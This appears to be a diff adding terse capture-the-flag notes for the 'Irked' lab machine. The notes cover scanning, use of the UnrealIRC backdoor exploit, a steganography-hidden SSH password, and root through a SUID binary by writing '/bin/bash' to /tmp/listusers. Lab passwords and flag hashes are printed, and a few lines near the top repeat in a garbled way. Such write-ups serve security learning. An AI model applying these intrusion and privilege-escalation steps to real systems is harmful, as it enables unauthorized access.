@@ -1,0 +1,46 @@
+nmap yields:
+* Apache webserver on port 80
+	dirb reports no relevant webdirectories
+	does not seem relevant
+* SSH server on port 22
+* Something on port 38217
+* IRC on ports 6697, 8067 and 65534
+	UnrealIRC
+
+searchsploit yields:
+* Backdoor command execution (metasploit)
+* msfconsol
+	UnrealIRC
+
+searchsploit yields:
+* Backdoor Command Execution (Metasploit)
+	exploits/linux/remote/16922.rb
+* Gains access as user ircd on port 8067 in /home/ircd/Unreal3.2
+Listing /home/ directory finds user djmardov
+cat /home/djmardov/Documents/user.txt: Permission denied
+ls -a /home/djmardov/Documents yields .backup
+cat /home/djmardov/Documens/.backup:
+	Super elite steg backup pw
+	UPupDOWNdownLRlrBAbaSSss
+Download image from webserver on port 80
+steghide extract -sf irked.jpg -xf steghide.output
+Use password from .backup (it says 'steg backup pw', and the image is the only
+ sensible thing to 'unsteg').
+Retrieve password Kab6h+m+bbp2J:HG	
+SSH with password djmardov@10.10.10.117
+cat Documents/user.txt
+	a66a78b12dc0e661a59d3f5c0267a8e
+User is owned! 
+
+Upload LinEnum.sh with python SimpleHTTPServer
+Run LinEnum with thorough tests, find SUID executables
+This yields the executable 'viewusers'
+This file will thus always be executed as root, even if ran by non-priv user
+Run 'viewuser' in shell and see all active shell sessions + an error:
+	'sh: 1: /tmp/listusers: not found'
+	This indicates the executable is looking for a shell command in file /tmp/listusers
+echo '/bin/bash' > /tmp/listusers; viewusers
+whoami -> root
+You are now root! :-) 
+cat /root/root.txt:
+	8d8e9e8be64654b6dccc3bff4522daf3
